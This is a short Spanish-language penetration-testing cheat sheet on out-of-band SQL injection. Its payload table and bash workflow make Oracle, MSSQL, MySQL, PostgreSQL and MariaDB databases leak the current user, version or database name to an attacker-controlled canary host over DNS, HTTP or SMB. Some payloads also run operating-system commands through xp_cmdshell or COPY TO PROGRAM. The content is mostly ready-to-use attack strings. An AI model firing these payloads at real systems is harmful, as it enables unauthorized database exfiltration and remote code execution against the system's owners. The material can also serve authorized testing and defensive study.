---
aliases:
  - OOB SQLi
  - Out-of-Band SQLi
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLi - Out of Band

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SELECT UTL_INADDR.get_host_address((SELECT user)\|\|'.CANARY.oast.fun') FROM dual` | Oracle resolves DNS con user actual en subdomain | Oracle con `UTL_INADDR` permitido + egress DNS. |
| `SELECT UTL_HTTP.request('http://CANARY.oast.fun/'\|\|(SELECT user)) FROM dual` | Oracle HTTP request con data exfil | Oracle con `UTL_HTTP` ACL permisivo + egress HTTP. |
| `DECLARE @q varchar(1024); SET @q='\\\\'+(SELECT user)+'.CANARY.oast.fun\\dir'; EXEC master..xp_dirtree @q` | MSSQL fuerza resolución UNC → DNS callback | MSSQL Windows + egress DNS o SMB. |
| `'; EXEC master..xp_cmdshell 'nslookup '+CAST((SELECT @@version) AS varchar(100))+'.CANARY.oast.fun'-- -` | MSSQL DNS exfil via nslookup en cmd | MSSQL con `xp_cmdshell` habilitado (admin priv). |
| `SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.CANARY.oast.fun\\\\x'))` | MySQL en Windows fuerza UNC lookup | MySQL/Windows + `secure_file_priv=''`. |
| `COPY (SELECT version()) TO PROGRAM 'nslookup $(SELECT user).CANARY.oast.fun'` | PostgreSQL ejecuta cmd con data | PostgreSQL superuser. Extremadamente potente (también RCE). |
| `'; SELECT * FROM dblink('host=CANARY.oast.fun user=postgres password=x dbname=postgres','SELECT version()')-- -` | PostgreSQL dblink connect a host atacante | `dblink` extension + egress TCP. |
| `'; CALL HTTPGetRequest('http://CANARY.oast.fun/'\|\|(SELECT user))-- -` | MariaDB con UDF custom | UDF instalada. |
^sqli-out

### Workflow

```bash
# 1. Setup Collaborator/Interactsh
# Burp Collaborator: dashboard → New URL
# Alt: interactsh-client (open source)
interactsh-client &
# Output: aaa.oast.fun

CANARY="aaa.oast.fun"
TARGET="https://target/items?id=1"

# 2. Identificar SGBD primero — error/version probes

# 3. MSSQL — DNS via xp_dirtree
PAYLOAD="'; DECLARE @q varchar(1024); SET @q='\\\\\\\\'+(SELECT db_name())+'.$CANARY\\\\x'; EXEC master..xp_dirtree @q-- -"
curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")"

# 4. Watch Collaborator dashboard — DNS hit con DB name embebido

# 5. Oracle UTL_INADDR
PAYLOAD="' AND 1=(SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)\\|\\|'.$CANARY') FROM dual)-- -"
curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")"
```

___

## Overview

**OOB SQLi** = exfiltrar via canal separado (DNS/HTTP/SMB) cuando In-Band y blind no funcionan. SGBD inicia conexión saliente → atacante captura en su listener.

**Vector más rápido que blind** — 1 request = N bytes exfiltrados (embebidos en subdomain). Limitaciones DNS: 63 chars/label, charset DNS-safe, encoding hex/base32.

**Por motor:**
- **Oracle**: `UTL_INADDR.get_host_address` (DNS), `UTL_HTTP.request` (HTTP).
- **MSSQL**: `xp_dirtree` (DNS/SMB), `xp_cmdshell + nslookup` (DNS via cmd).
- **MySQL**: `LOAD_FILE('\\\\...')` solo en Windows.
- **PostgreSQL**: `COPY ... TO PROGRAM` (RCE adjacent), `dblink` connection.

**Tools:**
- Burp Collaborator (Pro).
- [interactsh](https://github.com/projectdiscovery/interactsh) (open source).
- [DNSBin](http://dnsbin.zhack.ca/) (web-based).

***
